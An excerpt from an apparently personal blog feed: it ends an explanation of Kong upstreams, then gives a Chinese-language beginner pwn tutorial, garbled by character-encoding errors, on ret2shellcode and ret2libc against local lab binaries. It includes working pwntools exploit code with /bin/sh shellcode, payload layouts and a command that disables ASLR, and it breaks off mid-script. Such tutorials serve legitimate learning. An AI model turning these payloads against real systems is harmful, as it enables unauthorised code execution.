<p>The upstream object represents a virtual hostname and can be used to loadbalance incoming requests over multiple services (targets). So for example an upstream named <code>service.v1.xyz</code> with an API object created with an <code>upstream_url=https://service.v1.xyz/some/path</code>. Requests for this API would be proxied to the targets defined within the upstream.</p>
</blockquote>
<p>å¾ˆæŠ½è±¡çš„æ¦‚å¿µï¼Œå…¶å®ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œç±»æ¯”httpä¸­çš„Hostè¯·æ±‚å¤´ï¼ˆå’Œrouteä¸­çš„hostä¸€æ ·ï¼‰ï¼Œè¿™ä¸ªhostå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼ŒUpstreamä¸­çš„å®ä½“å’Œhostå€¼åŒåï¼Œåˆ›å»ºUpstreamï¼Œæ˜¯ä¸ºäº†æ§åˆ¶å‘åŒåhostå‘èµ·çš„è¯·æ±‚ï¼Œæˆ–è€…å¯¹åŒåhostçš„routeåšä¸€äº›é…ç½®ï¼Œå¥åº·æ£€æŸ¥ä¹‹ç±»çš„ã€‚</p>
]]></content>
		</item>
		
		<item>
			<title>pwnå®è·µè®°å½•--ropå…¥é—¨</title>
			<link>https://shankisme.com/posts/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/</link>
			<pubDate>Sat, 07 Mar 2020 21:43:55 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/</guid>
			<description>å‰è¨€ å›è¿‡æ¥è®°å½•å…¥é—¨å†ç¨‹ä¸»è¦æ˜¯ä¸ºäº†å¤ä¹ å·©å›ºpwnçš„åˆ†ææ€è·¯ã€‚å› ä¸ºå†™çš„å¾ˆè¯¦ç»†ï¼Œç¯‡å¹…å¾ˆé•¿ï¼Œæœªå†™å®Œçš„ä¼šç¬¬äºŒå¤©å†™ã€‚å…¨éƒ¨å†…å®¹åŒ…æ‹¬ï¼šret2shellcodeã€ret2libc(ç»•è¿‡NX)ã€ret2libc(ç»•è¿‡ASLR)ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚è‹¥ç†è§£æœ‰é”™è¯¯ï¼Œè¯·åœ¨è¯„è®ºåŒºæŒ‡æ­£ã€‚
æœ¬æ¬¡å›é¡¾æ¶‰åŠåˆ°çš„elfæ–‡ä»¶ä»¥åŠexpéƒ½èƒ½åœ¨è¿™é‡Œè·å–åˆ°ã€‚ ç¯å¢ƒå‡†å¤‡ï¼šlinux(32ä½ç¨‹åºè¿è¡Œç¯å¢ƒ)ã€IDA Proã€gdbæ’ä»¶ã€python+pwntoolsã€ä¸å±ˆæ„å¿—:) çŸ¥è¯†å›é¡¾ï¼šæ“ä½œç³»ç»Ÿé¢„é˜²äºŒè¿›åˆ¶æ¼æ´çš„ä¿æŠ¤æœºåˆ¶ã€elfæ–‡ä»¶ç»„æˆã€æ ˆæœºåˆ¶ã€å¤§å°ç«¯ã€‚
0x00 return2shellcode æ–‡ä»¶ï¼šlevel1 ä¹ æƒ¯æ€§æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼š
å¾ˆå¥½å…¨å…³ï¼Œæ¥ä¸‹æ¥åˆ©ç”¨IDA Pro F5å¤§æ³•æŸ¥çœ‹åæ±‡ç¼–ç»“æœï¼š å‘ç°è¯¥äºŒè¿›åˆ¶æ–‡ä»¶mainå‡½æ•°å…¥å£ç›´æ¥è°ƒç”¨vulnerable_function()å‡½æ•°ï¼Œç„¶åè°ƒç”¨äº†writeå‡½æ•°ã€‚è¿™é‡Œæä¸ªé†’ï¼Œåæ±‡ç¼–é‡åˆ°write()ã€read()ã€puts()ã€gets()ä¸€å®šç•™ä¸ªå¿ƒçœ¼ï¼Œè¿™äº›å‡½æ•°å¯¹ä»»æ„å˜é‡çš„å¤„ç†éƒ½å¯èƒ½é€ æˆæ ˆæº¢å‡ºï¼Œä¸è¿‡æœ¬é¢˜è¾“å‡ºçš„æ˜¯å­—ç¬¦ä¸²å¸¸é‡ï¼Œå¿½ç•¥ï¼Œç›´æ¥æŸ¥çœ‹vulnerable_function()ã€‚ çœ‹åˆ°è¯¥å‡½æ•°åˆ›å»ºäº†ä¸ªå±€éƒ¨å˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆï¼‰ï¼Œä½ç½®è·ç¦»ebp-0x88çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è·ç¦»åŸºæŒ‡é’ˆ136å­—èŠ‚ä½ç½®ã€‚read()å‡½æ•°è¯»å–äº†è¯¥å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œä¸Šæ–‡æåˆ°read()å‡½æ•°ä¸æ£€æŸ¥è¯»å–é™åˆ¶ï¼Œå¹¶ä¸”å±€éƒ¨å˜é‡å­˜æ”¾åœ¨æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadé•¿åº¦=136+4(å­˜å‚¨ebpæŒ‡é’ˆåœ°å€å¤§å°)+4(è¿”å›åœ°å€å¤§å°), æ¥æ”¹å˜å‡½æ•°è¿”å›åœ°å€ã€‚è€ƒè™‘åˆ°PIEå·²å…³ï¼Œå¹¶ä¸”140å­—èŠ‚çš„é•¿åº¦è¶³å¤Ÿå­˜å‚¨ä¸€ä¸ªshellcodeæ‰§è¡Œexecve(&amp;quot;/bin/sh&amp;quot;)ã€‚å› æ­¤æˆ‘ä»¬ä»payloadçš„å¼€å§‹ä½ç½®å­˜shellcodeï¼Œå‰©ä¸‹çš„ç”¨&amp;rsquo;A&amp;rsquo;è¡¥å…¨ï¼Œè¿”å›åœ°å€æŒ‡å‘payloadèµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡çš„èµ·å§‹åœ°å€ã€‚ä½†æ˜¯åœ°å€æˆ‘ä»¬è¿˜ä¸çŸ¥é“ï¼Œå› ä¸ºå®ƒæ˜¯åœ¨æ ˆé‡Œé¢åŠ è½½çš„ã€‚è€ƒè™‘åˆ°æ ˆçš„åŠ¨æ€å˜åŒ–ï¼ŒIDAProçš„é™æ€åˆ†ææ— æ³•å±•ç¤ºï¼ˆå®ƒçš„åŠ¨æ€åˆ†ææ¯”è¾ƒéº»çƒ¦ï¼‰ï¼Œæ¥ä¸‹æ¥ç”¨gdbé…åˆpetaæ’ä»¶è¿›è¡ŒåŠ¨æ€åˆ†æï¼š åœ¨å…¥å£å‡½æ•°ä¸‹æ–­ç‚¹ï¼š run/start æ‰§è¡Œåˆ°mainå‡½æ•°å…¥å£åœä¸‹ï¼š ä¾æ¬¡ next next åœ¨æ±‡ç¼–ä¸‹ä¸€æ­¥æ‰§è¡Œvulnerable_function()å‡½æ•°çš„æ—¶å€™ï¼Œstepå‘½ä»¤è¿›å…¥å‡½æ•°å†…éƒ¨ï¼š è¿›å…¥ä¹‹åï¼Œæˆ‘ä»¬å°±èƒ½çœ‹åˆ°è¯¥å‡½æ•°çš„æ ˆæƒ…å†µäº† æ¥ä¸‹æ¥ä¾æ¬¡next æ‰§è¡Œåˆ°read()å‡½æ•°çš„æ—¶å€™ï¼Œè±¡å¾æ€§è¾“å…¥å­—ç¬¦ï¼š å¯ä»¥çœ‹åˆ°æ ˆåŒº0xffffd060åœ°å€ä¸Šå­˜æ”¾äº†è¯¥å±€éƒ¨å˜é‡ï¼ˆä¸Šé¢çš„0xffffd060æ˜¯æ–‡å­—å¸¸é‡åŒºï¼ˆå¸¸é‡æ± ï¼‰èŒƒå›´å†…çš„åœ°å€ï¼Œä¸»è¦å­˜å‚¨å­—ç¬¦ä¸²å¸¸é‡ï¼‰ï¼Œè‡³æ­¤æ‰€æœ‰çš„åˆ†æå·¥ä½œå°±å®Œæˆäº†ã€‚
æ¥ä¸‹æ¥æœ€æœ€æœ€å…³é”®çš„åœ°æ–¹æ¥äº†ï¼Œå¾ˆå¤šåˆå­¦è€…éƒ½ä¼šè½è¿›å»çš„å‘ï¼šå…¶å®gdbè°ƒè¯•å’Œå®é™…æ‰§è¡Œç¨‹åºçš„æ ˆä½ç½®ç›¸æ¯”ä¼šæœ‰äº›åç§»ï¼Œä¸ºäº†æä¾›bufæ›´ç²¾ç¡®çš„ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦å¼€å¯core dumpåŠŸèƒ½æ¥æ”¶é›†å®é™…è¿è¡Œç¯å¢ƒä¸‹çš„å˜é‡åˆ†å¸ƒæƒ…å†µã€‚ æš‚æ—¶å¼€å¯core dumpå‘½ä»¤
ulimit -c unlimited æ‰§è¡Œlevel1:
./level1 è¾“å…¥å­—ç¬¦ä½¿æ ˆæº¢å‡ºã€‚ å¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹å¤šå‡ºæ¥äº†ä¸ªcoreæ–‡ä»¶ã€‚ æ¥ä¸‹æ¥ç”¨gdb é…åˆcoreæ–‡ä»¶å†æ¬¡è°ƒè¯•level1 ç„¶åè¾“å…¥ x $esp-144æŸ¥çœ‹bufçš„ä½ç½®, è¿™é‡Œçš„espæŒ‡çš„æ˜¯å®é™…ç¯å¢ƒä¸‹ç¨‹åºæ‰§è¡Œå‡ºé”™çš„æ—¶å€™çš„esp, æ‰§è¡Œè¿”å›å‘½ä»¤æ—¶ï¼Œespé€€å›åˆ°mainå‡½æ•°çš„æ ˆé¡¶ï¼Œå› æ­¤bufçš„ä½ç½® = espæŒ‡é’ˆå­˜çš„ä½ç½® - payloadçš„é•¿åº¦(144)ã€‚ å¾—åˆ°bufå®é™…åœ°å€ï¼š0xffffd0c0 æ¥ä¸‹æ¥æˆ‘ä»¬å°±èƒ½å®‰å¿ƒçš„å†™expäº†ã€‚
from pwn import * p = process(&amp;#39;./level1&amp;#39;) ret = 0xffffd0c0 shellcode = &amp;#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&amp;#34; shellcode += &amp;#34;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&amp;#34; shellcode += &amp;#34;\x0b\xcd\x80&amp;#34; payload = shellcode + &amp;#39;A&amp;#39; * (140 - len(shellcode)) + p32(ret) p.</description>
			<content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>å›è¿‡æ¥è®°å½•å…¥é—¨å†ç¨‹ä¸»è¦æ˜¯ä¸ºäº†å¤ä¹ å·©å›ºpwnçš„åˆ†ææ€è·¯ã€‚å› ä¸ºå†™çš„å¾ˆè¯¦ç»†ï¼Œç¯‡å¹…å¾ˆé•¿ï¼Œæœªå†™å®Œçš„ä¼šç¬¬äºŒå¤©å†™ã€‚å…¨éƒ¨å†…å®¹åŒ…æ‹¬ï¼šret2shellcodeã€ret2libc(ç»•è¿‡NX)ã€ret2libc(ç»•è¿‡ASLR)ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚è‹¥ç†è§£æœ‰é”™è¯¯ï¼Œè¯·åœ¨è¯„è®ºåŒºæŒ‡æ­£ã€‚</p>
<p>æœ¬æ¬¡å›é¡¾æ¶‰åŠåˆ°çš„elfæ–‡ä»¶ä»¥åŠexpéƒ½èƒ½åœ¨<a href="https://github.com/TonyShanc/new2pwn">è¿™é‡Œ</a>è·å–åˆ°ã€‚
ç¯å¢ƒå‡†å¤‡ï¼šlinux(32ä½ç¨‹åºè¿è¡Œç¯å¢ƒ)ã€IDA Proã€gdbæ’ä»¶ã€python+pwntoolsã€ä¸å±ˆæ„å¿—:)
çŸ¥è¯†å›é¡¾ï¼š<a href="https://blog.csdn.net/RChaos/article/details/104344276">æ“ä½œç³»ç»Ÿé¢„é˜²äºŒè¿›åˆ¶æ¼æ´çš„ä¿æŠ¤æœºåˆ¶</a>ã€elfæ–‡ä»¶ç»„æˆã€æ ˆæœºåˆ¶ã€å¤§å°ç«¯ã€‚</p>
<h2 id="0x00-return2shellcode">0x00 return2shellcode</h2>
<p>æ–‡ä»¶ï¼šlevel1
ä¹ æƒ¯æ€§æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼š</p>
<p>å¾ˆå¥½å…¨å…³ï¼Œæ¥ä¸‹æ¥åˆ©ç”¨IDA Pro F5å¤§æ³•æŸ¥çœ‹åæ±‡ç¼–ç»“æœï¼š
<img src="/img/pwn/3.jpg" alt="3.jpg">
å‘ç°è¯¥äºŒè¿›åˆ¶æ–‡ä»¶mainå‡½æ•°å…¥å£ç›´æ¥è°ƒç”¨vulnerable_function()å‡½æ•°ï¼Œç„¶åè°ƒç”¨äº†writeå‡½æ•°ã€‚è¿™é‡Œæä¸ªé†’ï¼Œåæ±‡ç¼–é‡åˆ°write()ã€read()ã€puts()ã€gets()ä¸€å®šç•™ä¸ªå¿ƒçœ¼ï¼Œè¿™äº›å‡½æ•°å¯¹ä»»æ„å˜é‡çš„å¤„ç†éƒ½å¯èƒ½é€ æˆæ ˆæº¢å‡ºï¼Œä¸è¿‡æœ¬é¢˜è¾“å‡ºçš„æ˜¯å­—ç¬¦ä¸²å¸¸é‡ï¼Œå¿½ç•¥ï¼Œç›´æ¥æŸ¥çœ‹vulnerable_function()ã€‚
<img src="/img/pwn/4.jpg" alt="4.jpg">
çœ‹åˆ°è¯¥å‡½æ•°åˆ›å»ºäº†ä¸ªå±€éƒ¨å˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆï¼‰ï¼Œä½ç½®è·ç¦»ebp-0x88çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è·ç¦»åŸºæŒ‡é’ˆ136å­—èŠ‚ä½ç½®ã€‚read()å‡½æ•°è¯»å–äº†è¯¥å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œä¸Šæ–‡æåˆ°read()å‡½æ•°ä¸æ£€æŸ¥è¯»å–é™åˆ¶ï¼Œå¹¶ä¸”å±€éƒ¨å˜é‡å­˜æ”¾åœ¨æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadé•¿åº¦=136+4(å­˜å‚¨ebpæŒ‡é’ˆåœ°å€å¤§å°)+4(è¿”å›åœ°å€å¤§å°), æ¥æ”¹å˜å‡½æ•°è¿”å›åœ°å€ã€‚è€ƒè™‘åˆ°PIEå·²å…³ï¼Œå¹¶ä¸”140å­—èŠ‚çš„é•¿åº¦è¶³å¤Ÿå­˜å‚¨ä¸€ä¸ªshellcodeæ‰§è¡Œexecve(&quot;/bin/sh&quot;)ã€‚å› æ­¤æˆ‘ä»¬ä»payloadçš„å¼€å§‹ä½ç½®å­˜shellcodeï¼Œå‰©ä¸‹çš„ç”¨&rsquo;A&rsquo;è¡¥å…¨ï¼Œè¿”å›åœ°å€æŒ‡å‘payloadèµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡çš„èµ·å§‹åœ°å€ã€‚ä½†æ˜¯åœ°å€æˆ‘ä»¬è¿˜ä¸çŸ¥é“ï¼Œå› ä¸ºå®ƒæ˜¯åœ¨æ ˆé‡Œé¢åŠ è½½çš„ã€‚è€ƒè™‘åˆ°æ ˆçš„åŠ¨æ€å˜åŒ–ï¼ŒIDAProçš„é™æ€åˆ†ææ— æ³•å±•ç¤ºï¼ˆå®ƒçš„åŠ¨æ€åˆ†ææ¯”è¾ƒéº»çƒ¦ï¼‰ï¼Œæ¥ä¸‹æ¥ç”¨<strong>gdbé…åˆpetaæ’ä»¶</strong>è¿›è¡ŒåŠ¨æ€åˆ†æï¼š
åœ¨å…¥å£å‡½æ•°ä¸‹æ–­ç‚¹ï¼š
<img src="/img/pwn/5.jpg" alt="5.jpg">
run/start æ‰§è¡Œåˆ°mainå‡½æ•°å…¥å£åœä¸‹ï¼š
<img src="/img/pwn/6.jpg" alt="6.jpg">
ä¾æ¬¡
next  next
åœ¨æ±‡ç¼–ä¸‹ä¸€æ­¥æ‰§è¡Œvulnerable_function()å‡½æ•°çš„æ—¶å€™ï¼Œstepå‘½ä»¤è¿›å…¥å‡½æ•°å†…éƒ¨ï¼š
<img src="/img/pwn/7.jpg" alt="7.jpg">
è¿›å…¥ä¹‹åï¼Œæˆ‘ä»¬å°±èƒ½çœ‹åˆ°è¯¥å‡½æ•°çš„æ ˆæƒ…å†µäº†
æ¥ä¸‹æ¥ä¾æ¬¡next æ‰§è¡Œåˆ°read()å‡½æ•°çš„æ—¶å€™ï¼Œè±¡å¾æ€§è¾“å…¥å­—ç¬¦ï¼š
<img src="/img/pwn/8.jpg" alt="8.jpg">
å¯ä»¥çœ‹åˆ°æ ˆåŒº0xffffd060åœ°å€ä¸Šå­˜æ”¾äº†è¯¥å±€éƒ¨å˜é‡ï¼ˆä¸Šé¢çš„0xffffd060æ˜¯æ–‡å­—å¸¸é‡åŒºï¼ˆå¸¸é‡æ± ï¼‰èŒƒå›´å†…çš„åœ°å€ï¼Œä¸»è¦å­˜å‚¨å­—ç¬¦ä¸²å¸¸é‡ï¼‰ï¼Œè‡³æ­¤æ‰€æœ‰çš„åˆ†æå·¥ä½œå°±å®Œæˆäº†ã€‚</p>
<p>æ¥ä¸‹æ¥æœ€æœ€æœ€å…³é”®çš„åœ°æ–¹æ¥äº†ï¼Œå¾ˆå¤šåˆå­¦è€…éƒ½ä¼šè½è¿›å»çš„å‘ï¼šå…¶å®gdbè°ƒè¯•å’Œå®é™…æ‰§è¡Œç¨‹åºçš„æ ˆä½ç½®ç›¸æ¯”ä¼šæœ‰äº›åç§»ï¼Œä¸ºäº†æä¾›bufæ›´ç²¾ç¡®çš„ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦å¼€å¯core dumpåŠŸèƒ½æ¥æ”¶é›†å®é™…è¿è¡Œç¯å¢ƒä¸‹çš„å˜é‡åˆ†å¸ƒæƒ…å†µã€‚
æš‚æ—¶å¼€å¯core dumpå‘½ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">ulimit</span> -c unlimited
</code></pre></div><p>æ‰§è¡Œlevel1:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./level1
</code></pre></div><p>è¾“å…¥å­—ç¬¦ä½¿æ ˆæº¢å‡ºã€‚
å¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹å¤šå‡ºæ¥äº†ä¸ªcoreæ–‡ä»¶ã€‚
æ¥ä¸‹æ¥ç”¨gdb é…åˆcoreæ–‡ä»¶å†æ¬¡è°ƒè¯•level1
ç„¶åè¾“å…¥<code> x $esp-144</code>æŸ¥çœ‹bufçš„ä½ç½®, è¿™é‡Œçš„espæŒ‡çš„æ˜¯å®é™…ç¯å¢ƒä¸‹ç¨‹åºæ‰§è¡Œå‡ºé”™çš„æ—¶å€™çš„esp, æ‰§è¡Œè¿”å›å‘½ä»¤æ—¶ï¼Œespé€€å›åˆ°mainå‡½æ•°çš„æ ˆé¡¶ï¼Œå› æ­¤bufçš„ä½ç½® = espæŒ‡é’ˆå­˜çš„ä½ç½® - payloadçš„é•¿åº¦(144)ã€‚
<img src="/img/pwn/10.jpg" alt="8.jpg">
å¾—åˆ°bufå®é™…åœ°å€ï¼š0xffffd0c0
æ¥ä¸‹æ¥æˆ‘ä»¬å°±èƒ½å®‰å¿ƒçš„å†™expäº†ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level1&#39;</span><span class="p">)</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0xffffd0c0</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s2">&#34;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s2">&#34;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&#34;</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">140</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>æ•ˆæœå¦‚ä¸‹ï¼š
<img src="/img/pwn/9.jpg" alt="8.jpg"></p>
<h2 id="0x01-ret2libcç»•è¿‡nx">0x01 ret2libc(ç»•è¿‡NX)</h2>
<p>æ–‡ä»¶ï¼šlevel2
ä¿æŠ¤ï¼šNX
æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼š
<img src="/img/pwn/11.jpg" alt="8.jpg">
PIE(ASLR)æ˜¯ç³»ç»Ÿä¿æŠ¤ï¼Œæœ‰æ—¶æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤æœºåˆ¶è™½ç„¶æ˜¾ç¤ºenabled , ä½†å…¶å®æ˜¯å¼€ç€çš„ï¼Œä¿é™©èµ·è§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat /proc/sys/kernel/randomize_va_space
</code></pre></div><p>æˆ–è€…å¤šæ¬¡ldd &lt;filename&gt;æŸ¥çœ‹åœ°å€åç§»æƒ…å†µ:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ldd level2
</code></pre></div><p>ä¿®æ”¹ç”¨é‡å®šå‘å°±è¡Œäº†ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -s
<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</code></pre></div><p>NXå¼€å¯ï¼Œæ ˆæ•°æ®æ®µæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œå› æ­¤ä¸èƒ½å°†shellcodeå­˜åœ¨æ ˆä¸Šã€‚è€ƒè™‘åˆ°PIE(ASLR)æ²¡å¼€ï¼ŒlibcåŠ¨æ€é“¾æ¥åº“ä¸­æœ‰execve()å‡½æ•°ï¼Œå¹¶ä¸”å­˜åœ¨&quot;/bin/sh&quot;å­—ç¬¦ä¸²ï¼Œæ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯è¦†ç›–è¿”å›åœ°å€ï¼Œæ‰§è¡Œlibcä¸­çš„execve()æˆ–system(), å¹¶å°†æŒ‡å‘&quot;/bin/sh&quot;çš„æŒ‡é’ˆä½œä¸ºå‡½æ•°çš„å‚æ•°ã€‚
ç”¨IDA Proæ‰“å¼€ï¼Œåæ±‡ç¼–å¹¶æ•´ç†æˆCä»£ç ï¼Œå‘ç°ä»£ç å’Œä¸Šä¸€é¢˜æ˜¯ä¸€æ ·çš„ï¼ŒçŸ¥è¯†NXæ²¡å¼€ï¼›
<img src="/img/pwn/3.jpg" alt="6.jpg">
<img src="/img/pwn/4.jpg" alt="6.jpg">
ä¸‹é¢è¦åšçš„å·¥ä½œæ˜¯ï¼šè°ƒè¯•level2ï¼Œåœ¨libcåŠ¨æ€é“¾æ¥åº“è½½å…¥ä¹‹åï¼Œæ‰¾åˆ°ä¸¤ä¸ªç³»ç»Ÿå‡½æ•°å’Œ&quot;/bin/sh&quot;çš„åœ°å€ã€‚
åœ¨main()å¤„è®¾æ–­ç‚¹åï¼Œè¿è¡Œã€‚
æ­¤æ—¶libcåŠ¨æ€åº“å·²ç»è½½å…¥äº†ï¼Œç„¶åç”¨print å’Œ findå‘½ä»¤åˆ†åˆ«æŸ¥æ‰¾å‡½æ•°å’Œå­—ç¬¦ä¸²çš„åœ°å€ï¼š
<img src="/img/pwn/12.jpg" alt="6.jpg">
<img src="/img/pwn/13.jpg" alt="6.jpg">
<img src="/img/pwn/14.jpg" alt="6.jpg">
ä¸‹é¢æ˜¯è¿™é“é¢˜çš„å…³é”®ï¼Œä¼ é€’çš„&quot;/bin/sh&quot;åº”è¯¥æ”¾åœ¨payloadçš„å“ªä¸ªä½ç½®ï¼Ÿ
ç­”ï¼šåœ¨è¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªé«˜åœ°å€ä½ã€‚
è¿™ä¸ªé—®é¢˜æˆ‘ä¹‹å‰åœ¨è°ƒè¯•ä¿¡æ¯é‡Œåˆ†æäº†å¥½ä¹…ï¼Œç»ˆäºæ‰¾åˆ°äº†æ¯”è¾ƒåˆç†çš„è§£é‡Š(åæ¥æ‰å‘ç°æ˜¯æˆ‘æ ˆæœºåˆ¶æ²¡å®Œå…¨çœ‹æ˜ç™½ã€‚ã€‚)ã€‚
æˆ‘ä»¬å…ˆå€ŸåŠ©main()å‡½æ•°å†…éƒ¨çš„write()è°ƒç”¨è¿‡ç¨‹æ¥çœ‹çœ‹å®ƒçš„å‚æ•°ä¼ é€’è¿‡ç¨‹ï¼š
<img src="/img/pwn/16.jpg" alt="6.jpg">
<img src="/img/pwn/15.jpg" alt="6.jpg">
å®¹æ˜“çœ‹å‡ºï¼Œæ‰§è¡Œcall 0x8048340 &lt;write@plt&gt; (pltä¸‹ä¸€é¢˜ä¼šè®²åˆ°) åï¼Œæ ˆä¸­å­˜è¿›äº†è¯¥æ±‡ç¼–æŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯write()çš„è¿”å›åœ°å€ã€‚ç»†çœ‹ï¼Œåˆä¼šå‘ç°writeå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼Œåœ¨è°ƒç”¨callæŒ‡ä»¤ä¹‹å‰å°±å·²ç»å‹æ ˆäº†ï¼Œå‹æ ˆé¡ºåºæ˜¯å‚æ•°ä»å³åˆ°å·¦çš„é¡ºåºã€‚å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">0x804843b &lt;main+14&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0xd
0x8048443 &lt;main+22&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048530
0x804844b &lt;main+30&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
</code></pre></div><p><img src="/img/pwn/17.jpg" alt="6.jpg">
å› æ­¤å¯ä»¥è¿™æ ·æ€»ç»“ï¼šå‡½æ•°å‚æ•°å…ˆé€†åºå…¥æ ˆï¼Œæ¥ä¸‹æ¥æ‰æ ‡è®°è¿”å›åœ°å€å’Œæ‰§è¡Œè¢«è°ƒç”¨å‡½æ•°æ±‡ç¼–æŒ‡ä»¤ã€‚
åˆ†æå®Œåï¼Œçœ‹çœ‹execve()å’Œsystem()çš„ä¼ å‚è¦æ±‚ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">int execve<span class="o">(</span>const char *filename, char *const argv<span class="o">[]</span>, char *const envp<span class="o">[])</span><span class="p">;</span>
int system<span class="o">(</span>const char * string<span class="o">)</span><span class="p">;</span>
</code></pre></div><p>å‘ç°systemåªè¦æ±‚ä¸€ä¸ªæ–‡ä»¶åå­—ç¬¦ä¸²æŒ‡é’ˆï¼Œæœ¬ç€è°å‚æ•°å°‘æ¬ºè´Ÿè°çš„æ€åº¦ï¼Œç›˜å®ƒï¼
æ„é€ payload: <code>payload = 'A' *140 + sys_addr + 'A' * 4 + binsh_addr</code>
æ³¨æ„ï¼è¿™é‡Œ&rsquo;A' * 4 æ˜¯å› ä¸ºè¿”å›åœ°å€æ˜¯ç›´æ¥åˆ°systemå‡½æ•°å†…éƒ¨çš„ï¼Œæ²¡æœ‰ç»è¿‡call &lt;system@plt&gt;, è¿”å›åœ°å€æœªå‹æ ˆ, ä½†æ˜¯æ ˆä¸çŸ¥é“ï¼Œå®ƒè¿˜ä¼šè®¤ä¸ºæœ‰ä¸ªè¿”å›åœ°å€ï¼Œå› æ­¤è¿™é‡Œçš„â€˜Aâ€™ * 4æ˜¯å¡«è¡¥è¿”å›åœ°å€ç”¨çš„ï¼Œå¦‚æœä½ è¿˜æƒ³åœ¨è¿”å›æ—¶åšè¿›ä¸€æ­¥çš„äº‹æƒ…ï¼Œå¯ä»¥å†™ä¸ªç¡®åˆ‡çš„åœ°å€ã€‚</p>
<p>è¿™é‡Œè¯´ä¸€å¥ï¼šè¿™é‡Œä¸ç”¨åƒä¸Šä¸€é¢˜äº§ç”Ÿcore dump ï¼Œå› ä¸ºè¿”å›åœ°å€ä¸åœ¨æ ˆä¸­ï¼Œæ²¡æœ‰åœ°å€åç§»å½±å“ã€‚
expå¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">)</span>
<span class="c1">#p = remote(&#39;127.0.0.1&#39;,10002)</span>
<span class="n">sys_addr</span><span class="o">=</span><span class="mh">0xf7e138b0</span>
